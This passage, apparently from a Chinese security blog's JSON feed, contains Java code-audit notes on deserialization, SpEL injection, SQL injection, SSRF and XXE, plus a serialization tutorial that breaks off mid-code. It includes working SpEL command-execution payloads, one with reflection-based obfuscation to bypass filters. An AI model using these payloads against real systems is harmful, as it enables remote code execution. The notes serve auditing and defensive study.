operator\">=</span> reader<span class=\"token punctuation\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">IOException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RuntimeException</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h2>反序列化</h2>\n<p>在Java中反序列化漏洞之所以比较严重的原因之一是：Java存在大量的公用库，例如Apache Commons Collections。WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些应用的反序列化漏洞能够得以利用，便是依靠了Apache Commons Collections。当然反序列漏洞的根源并不在于公共库，而是在于Java程序没有对反序列化生成的对象的类型做限制。</p>\n<p>代码审计时，首先查找用于解析的类库（xml、yml、json等），追踪方法调用栈然后考虑参数是否可控：</p>\n<ul>\n<li>\n<p><code>XMLDecoder.readObject</code></p>\n</li>\n<li>\n<p><code>Yaml.load</code></p>\n</li>\n<li>\n<p><code>XStream.fromXML </code></p>\n</li>\n<li>\n<p><code>ObjectMapper.readValue</code></p>\n</li>\n<li>\n<p><code>JSON.parseObject</code></p>\n</li>\n</ul>\n<p>当参数可控时，查找应用的Class Path中是否包含Apache Commons Collections等危险库（ysoserial所支持的其他库亦可）。同时满足了这些条件后，我们便可直接通过ysoserial生成所需的命令执行的反序列化语句。</p>\n<p>利用链通常分为三部分，触发点、中继点、执行点。</p>\n<ul>\n<li>\n<p>触发点</p>\n<ul>\n<li>触发点比较简单，主要是<code>readObj</code></li>\n</ul>\n</li>\n<li>\n<p>中继点，这里不太懂，管他呢 我也挖不出来~</p>\n<ul>\n<li>\n<p>动态代理，相关知识可参考<a href=\"https://juejin.im/post/5ad3e6b36fb9a028ba1fee6a\" target=\"_blank\" rel=\"noopener noreferrer\">Java动态代理</a>。要实现动态代理需要有三个类：</p>\n<ul>\n<li>\n<p>委托类，委托类就是处理业务逻辑的类，动态代理的目的就是在委托类中的代码运行时插入其他的操作，如日志打印。此外，委托类必须实现某个接口。</p>\n</li>\n<li>\n<p>中介类，中介类是对<code>InvocationHandler</code>接口的实现，它持有一个委托类对象的引用，在代理类调用相关方法时，会劫持到中介类的<code>invoke</code>方法中，在插入操作后，通过反射调用委托类的方法。</p>\n</li>\n<li>\n<p>代理类，代理类通过<code>Proxy.newProxyInstance</code>来创建，返回类型是委托类所实现的接口的类型。其他类会调用代理类来获取相应的功能，委托类是透明的。</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>执行点</strong></p>\n<p>反序列化利用链的挖掘比较困难的点是反序列化执行点，有了反序列化执行点，一般情况下都可以挖掘出不止一条的利用连。常见执行命令的方式：</p>\n<ul>\n<li>反射利用<code>Runtime.getRuntime().exec</code>或<code>java.lang.ProcessBuilder</code>执行</li>\n<li>JNDI远程调用</li>\n<li>Templates执行字节码</li>\n<li>EL表达式</li>\n<li>其他可执行命令的接口</li>\n</ul>\n</li>\n</ul>\n<h2>文件相关</h2>\n<p>文件上传、下载、删除</p>\n<p>关键字：</p>\n<ul>\n<li>JDK原始的<code>java.io.FileInputStream</code>类</li>\n<li>JDK原始的<code>java.io.RandomAccessFile</code>类</li>\n<li>Apache Commons IO提供的<code>org.apache.commons.io.FileUtils</code>类</li>\n<li>JDK1.7新增的基于NIO非阻塞异步读取文件的<code>java.nio.channels.AsynchronousFileChannel</code>类。</li>\n<li>JDK1.7新增的基于NIO读取文件的<code>java.nio.file.Files</code>类。常用方法如:<code>Files.readAllBytes</code>、<code>Files.readAllLines</code></li>\n<li><code>FileInputStream</code></li>\n<li><code>FileOutputStream</code></li>\n<li><code>File</code></li>\n<li><code>FileUtils</code></li>\n<li><code>IOUtils</code></li>\n<li><code>BufferedReader</code></li>\n<li><code>ServletFileUpload</code></li>\n<li><code>MultipartFile</code></li>\n<li><code>CommonsMultipartFile</code></li>\n<li><code>PrintWriter</code></li>\n<li><code>ZipInputStream</code></li>\n<li><code>ZipEntry.getSize</code></li>\n<li><code>Delete</code></li>\n<li><code>deleteFile</code></li>\n<li><code>fileName</code></li>\n<li><code>filePath</code></li>\n</ul>\n<p>找到对应的地址后跟踪方法调用栈，最后找他的入口点即客户端传参获取地点进行分析</p>\n<h2>表达式注入</h2>\n<p>Spring为解析SpEL提供了两套不同的接口，分别是<code>SimpleEvaluationContext</code>及<code>StandardEvaluationContext</code>。<code>SimpleEvaluationContext</code>仅支持SpEL语法的子集，抛弃了Java类型引用、构造函数及beam引用相对较为安全。而<code>StandardEvaluationContext</code>则包含了SpEL的所有功能，并且在不指定\n<code>EvaluationContext</code>的情况下，将默认采用<code>StandardEvaluationContext</code>。\n漏洞成因：很大一部分开发人员未对用户输入进行处理就直接通过解析引擎对SpEL继续解析。一旦用户能够控制解析的SpEL语句，便可通过反射的方式构造代码执行的SpEL语句，从而达到RCE的目的。</p>\n<p><strong>SpEL表达式的用法</strong></p>\n<ol>\n<li>\n<p>注解（无法外部传入）</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#{表达式}\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> arg<span class=\"token punctuation\">;</span>\n</code></pre></div></li>\n<li>\n<p>xml</p>\n<div class=\"language-xml\" data-ext=\"xml\" data-title=\"xml\"><pre class=\"language-xml\"><code><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>bean</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Bean1<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>com.test.xxx<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>property</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>arg<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#{表达式}<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>bean</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre></div><p>前面两种情况通常也是写死在代码中的，但是也有已知的利用场景，就是利用反序列化让程序加载我们事先构造好的恶意xml文件，如jackson的CVE-2017-17485、weblogic的CVE-2019-2725等。</p>\n</li>\n<li>\n<p>在代码中处理外部传入的表达式</p>\n<p>这部分是关注的重点。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token annotation punctuation\">@RequestMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/spel\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">spel</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@RequestParam</span><span class=\"token punctuation\">(</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"spel\"</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">String</span> spel<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">ExpressionParser</span> expressionParser <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SpelExpressionParser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Expression</span> expression <span class=\"token operator\">=</span> expressionParser<span class=\"token punctuation\">.</span><span class=\"token function\">parseExpression</span><span class=\"token punctuation\">(</span>spel<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Object</span> object <span class=\"token operator\">=</span> expression<span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> object<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div></li>\n</ol>\n<p><strong>漏洞可以利用的前置条件有三个：</strong></p>\n<ol>\n<li>传入的表达式没过滤</li>\n<li>表达式解析之后调用了<code>getValue/setValue</code>方法</li>\n<li>使用<code>StandardEvaluationContext</code>（默认）作为上下文对象</li>\n</ol>\n<p><strong>想要执行命令，spel表达式有如下两种：</strong></p>\n<ul>\n<li>\n<p>使用<code>T(Type)</code>表示<code>Type</code>类的实例,<code>Type</code>为全限定名称,如<code>T(com.test.Bean1)</code>。但是<code>java.lang</code>例外,该包下的类可以不指定包名。得到类实例后会访问类静态方法与字段。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">T</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span></span>Runtime</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"whoami\"</span><span class=\"token punctuation\">)</span>\n</code></pre></div></li>\n<li>\n<p>直接通过java语法实例化对象、调用方法</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">new</span> <span class=\"token class-name\">ProcessBuilder</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"whoami\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">//可以利用反射来绕过一些过滤</span>\n#<span class=\"token punctuation\">{</span>''<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span>'java<span class=\"token punctuation\">.</span>la<span class=\"token char\">'+'</span><span class=\"token class-name\"><span class=\"token namespace\">ng<span class=\"token punctuation\">.</span></span>Ru</span><span class=\"token char\">'+'</span>ntime'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token char\">'ex'</span><span class=\"token operator\">+</span><span class=\"token char\">'ec'</span><span class=\"token punctuation\">,</span>''<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>''<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span>'java<span class=\"token punctuation\">.</span>la<span class=\"token char\">'+'</span><span class=\"token class-name\"><span class=\"token namespace\">ng<span class=\"token punctuation\">.</span></span>Ru</span><span class=\"token char\">'+'</span>ntime'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token char\">'getRu'</span><span class=\"token operator\">+</span><span class=\"token char\">'ntime'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token char\">'calc'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\n</code></pre></div></li>\n</ul>\n<p><strong>审计技巧：</strong></p>\n<p>全局查找关键字</p>\n<ul>\n<li><code>org.springframework.expression</code></li>\n<li><code>parseExpression</code></li>\n<li><code>getValue</code></li>\n<li><code>getValueType</code></li>\n<li><code>value=\"#{*}</code></li>\n</ul>\n<h2>SQL注入</h2>\n<p><strong>执行sql语句的几种方式</strong></p>\n<ol>\n<li>JDBC</li>\n<li>Hibernate</li>\n<li>Mybatis</li>\n</ol>\n<p><strong>审计技巧</strong></p>\n<ul>\n<li>\n<p>使用<code>statement</code>对象带入数据库中查询</p>\n</li>\n<li>\n<p><code>+</code>、<code>append</code>直接拼接（<strong>没有预编译</strong>）</p>\n</li>\n<li>\n<p><code>like</code>、<code>order by</code>等无法使用<strong>预编译</strong>的语句</p>\n</li>\n<li>\n<p><code>$()</code>拼接参数</p>\n</li>\n<li>\n<p>常用的sql查询关键字，如<code>Select</code>,<code>insert</code>,<code>update</code>,<code>delete</code></p>\n</li>\n<li>\n<p><code>%</code>、<code>in</code>等</p>\n</li>\n</ul>\n<p>找到对应的地址后跟踪方法调用栈，最后找客户端传参获取地点进行分析</p>\n<h2>SSRF</h2>\n<p>SSRF漏洞形成的原因大部分是因为服务端提供了可以从其他服务器获取资源的功能，然而并没有对用户的输入以及发起请求的url进行过滤&amp;限制，从而导致了ssrf的漏洞。</p>\n<p><strong>常见漏洞情况</strong></p>\n<ul>\n<li>抓取用户输入图片的地址并且本地化存储</li>\n<li>从远程服务器请求资源</li>\n<li>对外发起网络请求</li>\n</ul>\n<p><strong>利用方式</strong></p>\n<ul>\n<li>利用file协议读取文件内容（仅限使用URLConnection或URL发起的请求）</li>\n<li>利用http 进行内网web服务端口探测</li>\n<li>利用http 进行内网非web服务端口探测(如果将异常抛出来的情况下)</li>\n<li>利用http进行NTLM-relay攻击(仅限 HttpURLConnection 或者二次包装 HttpURLConnection 并未复写AuthenticationInfo方法的对象)  <strong>不懂</strong></li>\n</ul>\n<p><strong>审计技巧</strong></p>\n<ul>\n<li>\n<p>全局查找<code>URLConnection</code>、<code>HttpURLConnection</code>、<code>HttpClient</code>、<code>Request</code>、<code>okhttp</code>、<code>OkHttpClient</code>、<code>Request.Get</code>、<code>Request.post</code>、<code>URL.openStream</code>、<code>ImageIO</code>等能够发起远程请求的类及函数，找到对应地址后打断点跟踪引用其的方法调用栈，从客户端传参开始，判断是否可控，及可控情况</p>\n</li>\n<li>\n<p>SSRF漏洞<strong>URL</strong>中常出现url、f、file、page等<strong>参数</strong>。</p>\n</li>\n</ul>\n<h2>XXE</h2>\n<p><strong>解析XML的几种方式</strong></p>\n<ul>\n<li>XMLReader</li>\n<li>SAXBuilder</li>\n<li>SAXReader</li>\n<li>SAXParserFactory</li>\n<li>Digester</li>\n<li>DocumentBuilderFactory</li>\n</ul>\n<p><strong>审计技巧</strong></p>\n<ul>\n<li>\n<p><code>Documentbuilder</code></p>\n</li>\n<li>\n<p><code>DocumentBuilderFactory</code></p>\n</li>\n<li>\n<p><code>SAXReader</code></p>\n</li>\n<li>\n<p><code>SAXParser</code></p>\n</li>\n<li>\n<p><code>SAXParserFactory</code></p>\n</li>\n<li>\n<p><code>SAXBuilder</code></p>\n</li>\n<li>\n<p><code>TransformerFactory</code></p>\n</li>\n<li>\n<p><code>reqXml</code></p>\n</li>\n<li>\n<p><code>getInputStream</code></p>\n</li>\n<li>\n<p><code>XMLReaderFactory</code></p>\n</li>\n<li>\n<p><code>.newInstance</code></p>\n</li>\n<li>\n<p><code>SchemaFactory</code></p>\n</li>\n<li>\n<p><code>SAXTransformerFactory</code></p>\n</li>\n<li>\n<p><code>javax.xml.bind</code></p>\n</li>\n<li>\n<p><code>XMLReader</code></p>\n</li>\n<li>\n<p><code>XmlUtils.get</code></p>\n</li>\n<li>\n<p><code>Validator</code></p>\n</li>\n</ul>\n<p>找到对应的地址后跟踪方法调用栈，最后找他的入口点即客户端传参获取地点进行分析</p>\n<p>xxe的防御比较简单，禁用外部实体即可。</p>\n<h2>XSS</h2>\n<p>不想写了</p>\n",
      "date_published": "2024-08-15T13:54:05.000Z",
      "date_modified": "2024-08-15T13:54:05.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "反序列化漏洞详解",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/3-JavaVul/deserialize.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/3-JavaVul/deserialize.html",
      "summary": "反序列化漏洞详解\n反序列化漏洞简介\n许多编程语言都提供对序列化的内在支持\n\nPHP将对象序列化为字符串格式\n\nimg8img8\n\nJava将对象序列化为二进制格式\n\nJava中的API实现：\n位置：java.objectOuputStream   java.io.ObjectInputStream\n序列化 ：objectOutputStream类 --...",
      "content_html": "\n<h3>反序列化漏洞简介</h3>\n<p>许多编程语言都提供对序列化的内在支持</p>\n<ul>\n<li>PHP将对象序列化为字符串格式</li>\n</ul>\n<figure><figcaption>img8</figcaption></figure>\n<ul>\n<li>Java将对象序列化为二进制格式</li>\n</ul>\n<p><strong>Java中的API实现：</strong></p>\n<p>位置：java.objectOuputStream   java.io.ObjectInputStream</p>\n<p><strong>序列化</strong> ：objectOutputStream类 --&gt;writeObject()</p>\n<p>该方法对参数指定的obj对象进行序列化，对字节序列写到一个目标输出流中。按JAVA的标准约定是给文件一个.ser扩展名</p>\n<p><strong>反序列化</strong>: objectInputStream类–&gt;readObject()</p>\n<p>该方法从一个源输入流中读取字节序列，在·把他们反序列化为一个对象，并将其返回。</p>\n<h4>漏洞源起</h4>\n<p>2015年1月份,国外安全研究人员 Gabriel Lawrence 和 Chris Frohoff 公布了一个影响范围相当广的 Apache Commons 工具集远程代码执行(RCE)漏洞。由于 Apache Commons 工集几乎是 Java 技术平台中应用的最广泛的工具库,因此影响几乎遍及整个 Java 阵营。</p>\n<p>同年11月份，FoxGlove Security 安全团队发布的一篇博客中提到 Java 反序列化漏洞，该漏洞可攻击最新版的 WebLogic、WebSphere、JBoss、Jenkins、OpenNMS 应用，能实现远程任意代码执行。且在漏洞被发现的 9 个月后依然没有有效的 Java 库补丁来针对受到影响的产品进行加固。</p>\n<p>有很多经典案例 如</p>\n<ul>\n<li>Apache Commons Collections序列化RCE漏洞</li>\n<li>Spring框架反序列化漏洞</li>\n<li>Fastjson反序列化漏洞</li>\n<li>Apache Shiro Java 反序列化漏洞</li>\n</ul>\n<h4>漏洞影响主要产品</h4>\n<p>机器上一旦有这些应用，即处于“裸奔”状态。黑客可随时利用此漏洞执行任意系统命令，完全获取机器的控制权限，破坏或窃取机器上的数据。</p>\n<p>**序列化：**将对象的状态信息转换为可以存储或传输的形式的过程（将 Java 对象转换成字节流的过程）。</p>\n<p>**反序列化：**就是将序列化后的字节序列还原为原本的对象的过程。</p>\n<p>**序列化与反序列化的目的：**在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。(将对象转换为字节序列，通常用在跨语言、跨平台、网络传输、存储以及进程间传递对象，最重要的作用就是在传递和保存对象时，保证对象的完整性和可传递性)</p>\n<figure><figcaption>img1</figcaption></figure>\n<h3>Java反序列化原理</h3>\n<h4>序列化</h4>\n<p>序列化：在java中实现序列化需要实现了<code>java.io.Serializable</code>或者<code>java.io.Externalizable</code>接口的类的对象，当且仅当对象的类实现上面两个对象时，该对象才有资格进行序列化。</p>\n<p><code>Externalizable</code> 接口继承自 <code>Serializable</code> 接口，实现<code>Externalizable</code>接口的类完全由自身来控制序列化的行为，而仅实现 <code>Serializable</code> 接口的类可以采用默认的序列化方式。</p>\n<p>然而真正的序列化动作不需要靠<code>Serializable</code>完成，它只是一个标记接口(Marker Interface)，不包含任何方法，该接口告诉Java虚拟机(JVM)该类的对象已准备好写入持久性存储或通过网络进行读取。</p>\n<figure><figcaption>img2</figcaption></figure>\n<p>例如想要对Person类进行序列化和反序列化操作：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>hillstonenet</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Serializable</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Serializable</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> age<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> age<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>\n</code></pre></div><div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>hillstonenet</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InvocationTargetException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">NoSuchMethodException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InvocationTargetException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IllegalAccessException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InstantiationException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">FileOutputStream</span> out <span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"person.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">ObjectOutputStream</span> obj_out <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        obj_out<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"z3\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p><code>FileOutputStream</code>和<code>ObjectOutputStream</code>是java的流操作，可以把<code>OutputStream</code>当做一个单向流出的水管，<code>FileOutputStream</code>打开了文件，就相当于给文件接了一个<code>File</code>类型水管，然后把<code>FileOutputStream</code>类型对象传给了<code>ObjectOutputStream</code>，相当于把<code>File</code>类型水管接到了Object类型水管。由于<code>Object</code>类是所有类的父类，所以<code>Object</code>类型水管可以投放任何对象。</p>\n<p>这里创建了<code>Person</code>对象并传给<code>writeObject</code>方法，相当于把<code>Person</code>对象扔进了<code>Object</code>类型水管，这样就把<code>Person</code>对象写入了文件。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Person对象-&gt;Object类型水管-&gt;File类型水管-&gt;文件\n</code></pre></div><p>如果我想把序列化对象写入byte数组，那就创建个<code>byteArrayOutputStream</code>类型水管，然后把它接到<code>Object</code>类型水管上，后面步骤不变，则：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Person对象-&gt;Object类型水管-&gt;byte类型水管-&gt;byte数组\n</code></pre></div><p><strong>查看序列化后的内容:</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>java -jar SerializationDumper-v1.13.jar -r person.out\n</code></pre></div><figure><figcaption>img3</figcaption></figure>\n<figure><figcaption>img4</figcaption></figure>\n<h4>反序列化</h4>\n<p>把<code>Output</code>换为了<code>Input</code>，把<code>writeObject</code>换为了<code>readObject</code>。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>hillstonenet</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InvocationTargetException</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">NoSuchMethodException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InvocationTargetException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IllegalAccessException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">InstantiationException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">FileOutputStream</span> out <span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"person.out\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">ObjectOutputStream</span> obj_out <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        obj_out<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"z3\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token class-name\">FileInputStream</span> in <span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileInputStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"person.out\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">ObjectInput</span> obj_in <span class=\"token operator\">=</span> <span class=\"token 